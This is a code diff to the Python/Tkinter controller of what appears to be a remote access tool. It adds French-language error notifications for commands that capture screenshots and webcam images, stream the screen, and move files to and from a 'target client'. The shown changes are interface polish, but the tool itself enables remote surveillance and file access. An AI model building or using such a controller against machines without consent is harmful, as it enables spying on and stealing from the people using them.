@@ -783,17 +783,91 @@ QUICK START:
     # CORE SERVER LOGIC
     # ═══════════════════════════════════════════════════════════════════
 
-    def log_message(self, msg, level="info"):
+    def log_message(self, msg, level="info", client_ip=None, operation=None,
+                    cause=None, suggestion=None):
         try:
             self.console.config(state="normal")
-            colors = {"info": self.text_color, "success": self.success_color, "warning": self.warning_color, "error": self.error_color}
-            prefixes = {"info": "[*]", "success": "[+]", "warning": "[!]", "error": "[X]"}
+            colors   = {"info": self.text_color, "success": self.success_color,
+                        "warning": self.warning_color, "error": self.error_color}
+            prefixes = {"info": "[*]", "success": "[+]", "warning": "[!]",
+                        "error": "[✕]", "timeout": "[⏱]"}
             color = colors.get(level, self.text_color)
             self.console.tag_config(level, foreground=color)
             ts = time.strftime("%H:%M:%S")
-            self.console.insert(tk.END, f"[{ts}] {prefixes.get(level, '[*]')} {msg}\n", level)
-            self.console.see(tk.END)
+            suffix = ""
+            if client_ip:  suffix += f" · {client_ip}"
+            if cause:      suffix += f" · {cause}"
+            if suggestion: suffix += f" → {suggestion}"
+            self.console.insert("end", f"[{ts}] {prefixes.get(level,'[*]')} {msg}{suffix}\n", level)
+            self.console.see("end")
             self.console.config(state="disabled")
+        except Exception:
+            pass
+        if level in ("error", "warning", "timeout") and (client_ip or cause or suggestion):
+            self.root.after(0, lambda: self.show_notification(
+                level, msg, client_ip=client_ip, operation=operation,
+                cause=cause, suggestion=suggestion))
+
+    def show_notification(self, level, title, client_ip=None, operation=None,
+                           cause=None, suggestion=None):
+        colors = {
+            "error":   (self.error_color,   "#1a1e2e"),
+            "warning": (self.warning_color, "#1a1e2e"),
+            "timeout": (self.orange_color,  "#1a1e2e"),
+            "success": (self.success_color, "#1a1e2e"),
+            "info":    (self.info_color,    "#1a1e2e"),
+        }
+        icons = {"error": "✕", "warning": "⚠", "timeout": "⏱", "success": "✓", "info": "ℹ"}
+        border_clr, bg_clr = colors.get(level, colors["info"])
+        icon = icons.get(level, "ℹ")
+        ts = time.strftime("%H:%M:%S")
+        notif = tk.Frame(self._notif_zone, bg=bg_clr,
+                         highlightbackground=border_clr, highlightthickness=1)
+        accent_bar = tk.Frame(notif, bg=border_clr, width=4)
+        accent_bar.pack(side="left", fill="y")
+        inner = tk.Frame(notif, bg=bg_clr)
+        inner.pack(side="left", fill="both", expand=True, padx=8, pady=6)
+        row1 = tk.Frame(inner, bg=bg_clr)
+        row1.pack(fill="x")
+        tk.Label(row1, text=icon, fg=border_clr, bg=bg_clr,
+                 font=("Segoe UI", 10)).pack(side="left")
+        tk.Label(row1, text=f" {title}", fg=border_clr, bg=bg_clr,
+                 font=("Segoe UI", 9, "bold")).pack(side="left")
+        tk.Label(row1, text=f"  {ts}", fg=self.text_muted, bg=bg_clr,
+                 font=("Segoe UI", 8)).pack(side="left")
+        close_btn = tk.Label(row1, text="✕", fg=self.text_muted, bg=bg_clr,
+                              font=("Segoe UI", 9), cursor="hand2")
+        close_btn.pack(side="right")
+        close_btn.bind("<Button-1>", lambda e, n=notif: self._dismiss_notification(n))
+        ctx_parts = []
+        if client_ip:  ctx_parts.append(f"Client: {client_ip}")
+        if operation:  ctx_parts.append(f"Opération: {operation}")
+        if cause:      ctx_parts.append(f"Cause: {cause}")
+        if ctx_parts:
+            row2 = tk.Frame(inner, bg=bg_clr)
+            row2.pack(fill="x", pady=(2, 0))
+            tk.Label(row2, text="  " + "  ·  ".join(ctx_parts), fg=self.text_color,
+                     bg=bg_clr, font=("Segoe UI", 8), anchor="w").pack(side="left")
+        if suggestion:
+            row3 = tk.Frame(inner, bg=bg_clr)
+            row3.pack(fill="x", pady=(2, 0))
+            tk.Label(row3, text=f"  → {suggestion}", fg=self.accent_color,
+                     bg=bg_clr, font=("Segoe UI", 8), anchor="w").pack(side="left")
+        notif.pack(fill="x", pady=2)
+        self._notif_widgets.append(notif)
+        if level in ("error", "warning", "timeout"):
+            self._alert_count += 1
+            self._alert_badge.config(text=f"⚠ {self._alert_count} alerte{'s' if self._alert_count > 1 else ''}")
+            if hasattr(self, "_stat_alerts"):
+                self._stat_alerts.config(text=str(self._alert_count))
+        if level in ("success", "info"):
+            self.root.after(30000, lambda: self._dismiss_notification(notif))
+
+    def _dismiss_notification(self, notif):
+        try:
+            notif.destroy()
+            if notif in self._notif_widgets:
+                self._notif_widgets.remove(notif)
         except Exception:
             pass
 
@@ -806,7 +880,18 @@ QUICK START:
             self.server_socket.listen(5)
             self.server_socket.settimeout(1.0)
         except Exception as e:
-            self.log_message(f"Server start failed: {e}", "error")
+            errno_str = str(e)
+            suggestion = "Changer le port dans Paramètres ou libérer le port actuel"
+            if "Address already in use" in errno_str or "10048" in errno_str:
+                cause = f"Port {port} déjà utilisé (errno EADDRINUSE)"
+            elif "Permission" in errno_str:
+                cause = "Permissions insuffisantes pour écouter sur ce port"
+                suggestion = "Utiliser un port > 1024 ou lancer en administrateur"
+            else:
+                cause = errno_str
+            self.log_message("Démarrage serveur échoué", "error",
+                              operation=f"bind {host}:{port}",
+                              cause=cause, suggestion=suggestion)
             return
 
         self.stop_flag.clear()
@@ -908,13 +993,35 @@ QUICK START:
     def _send_recv(self, cmd):
         sock, key = self._get_sock_key()
         if not sock:
-            self.log_message("No client selected", "error")
+            self.log_message("Aucun client sélectionné", "warning",
+                              cause="Aucun client actif",
+                              suggestion="Sélectionne un client dans Dashboard → Clients")
             return None
         try:
             send_msg(sock, cmd, key)
             return recv_msg_str(sock, key)
+        except socket.timeout:
+            cip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
+            self.log_message("Timeout commande", "timeout",
+                              client_ip=cip, operation=cmd[:30],
+                              cause="Délai de réponse dépassé (15s)",
+                              suggestion="Augmenter timeout dans Paramètres ou vérifier la connexion")
+            self._drop_client()
+            return None
+        except (ConnectionResetError, BrokenPipeError) as e:
+            cip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
+            self.log_message("Connexion perdue", "error",
+                              client_ip=cip, operation=cmd[:30],
+                              cause=f"Connexion réinitialisée ({type(e).__name__})",
+                              suggestion="Le client s'est déconnecté — il tentera de se reconnecter automatiquement")
+            self._drop_client()
+            return None
         except Exception as e:
-            self.log_message(f"Error: {e}", "error")
+            cip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
+            self.log_message("Erreur réseau", "error",
+                              client_ip=cip, operation=cmd[:30],
+                              cause=str(e),
+                              suggestion="Vérifier la connexion réseau et relancer le client")
             self._drop_client()
             return None
 
@@ -1029,7 +1136,13 @@ QUICK START:
                         self.root.after(0, lambda: self.log_message("Screenshot captured", "success"))
                         if self.report: self.report.add_screenshot(f"screenshot_{len(self.screenshots)}.png")
                 else:
-                    self.root.after(0, lambda: self.log_message("Screenshot failed", "error"))
+                    cip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
+                    self.root.after(0, lambda: self.log_message(
+                        "Screenshot échoué", "error",
+                        client_ip=cip, operation="capture_ecran",
+                        cause="Réponse FAIL du client (pyautogui peut-être absent)",
+                        suggestion="pip install pyautogui sur le client cible"
+                    ))
 
             elif cmd == "webcam":
                 send_msg(sock, "webcam", key)
@@ -1043,7 +1156,13 @@ QUICK START:
                         self.root.after(0, self._show_webcam)
                         self.root.after(0, lambda: self.log_message("Webcam captured", "success"))
                 else:
-                    self.root.after(0, lambda: self.log_message("Webcam failed", "error"))
+                    cip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
+                    self.root.after(0, lambda: self.log_message(
+                        "Webcam échouée", "error",
+                        client_ip=cip, operation="capture_webcam",
+                        cause="Réponse FAIL du client (opencv-python peut-être absent)",
+                        suggestion="pip install opencv-python sur le client cible"
+                    ))
 
             elif cmd == "stream_start":
                 self.streaming = True
@@ -1051,7 +1170,13 @@ QUICK START:
                 status = recv_msg_str(sock, key)
                 if status != "PASS":
                     self.streaming = False
-                    self.root.after(0, lambda: self.log_message("Stream failed", "error"))
+                    cip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
+                    self.root.after(0, lambda: self.log_message(
+                        "Stream échoué", "error",
+                        client_ip=cip, operation="stream_start",
+                        cause="Réponse FAIL du client (pyautogui/PIL peut-être absent)",
+                        suggestion="pip install pyautogui pillow sur le client cible"
+                    ))
                     return
                 self.root.after(0, lambda: (self.stream_start_btn.config(state="disabled"), self.stream_stop_btn.config(state="normal")))
                 self.root.after(0, lambda: self.log_message("Stream started", "success"))
@@ -1364,8 +1489,14 @@ QUICK START:
             self.root.after(0, lambda: self.log_message(resp or "Upload done", "success"))
             if self.report: self.report.add_file_access("upload", filepath)
         except Exception as e:
+            ip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
             err_msg = str(e)
-            self.root.after(0, lambda: self.log_message(f"Upload error: {err_msg}", "error"))
+            self.root.after(0, lambda: self.log_message(
+                "Erreur upload", "error",
+                client_ip=ip, operation=f"upload {os.path.basename(filepath)}",
+                cause=err_msg,
+                suggestion="Vérifier les permissions sur le client et la connexion réseau"
+            ))
 
     def _do_download(self, cmd):
         remote = cmd.split(" ", 1)[1]
@@ -1375,7 +1506,14 @@ QUICK START:
             send_msg(sock, f"download {remote}", key)
             status = recv_msg_str(sock, key)
             if status == "FAIL":
-                self.root.after(0, lambda: self.log_message(f"Not found: {remote}", "error")); return
+                ip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
+                self.root.after(0, lambda: self.log_message(
+                    "Fichier introuvable", "error",
+                    client_ip=ip, operation=f"download {remote}",
+                    cause=f"Le client ne trouve pas: {remote}",
+                    suggestion="Vérifier le chemin exact avec 'listdir' dans Terminal"
+                ))
+                return
             data = recv_msg(sock, key)
             if data:
                 local = os.path.basename(remote)
@@ -1383,8 +1521,14 @@ QUICK START:
                 self.root.after(0, lambda: self.log_message(f"Downloaded: {local} ({len(data)} bytes)", "success"))
                 if self.report: self.report.add_file_access("download", remote)
         except Exception as e:
+            ip = self.clients.get(self.current_client_id, {}).get("address", ("?",))[0]
             err_msg = str(e)
-            self.root.after(0, lambda: self.log_message(f"Download error: {err_msg}", "error"))
+            self.root.after(0, lambda: self.log_message(
+                "Erreur download", "error",
+                client_ip=ip, operation=f"download {remote}",
+                cause=err_msg,
+                suggestion="Vérifier les permissions sur le fichier distant"
+            ))
 
     # ─── Report ──────────────────────────────────────────
 
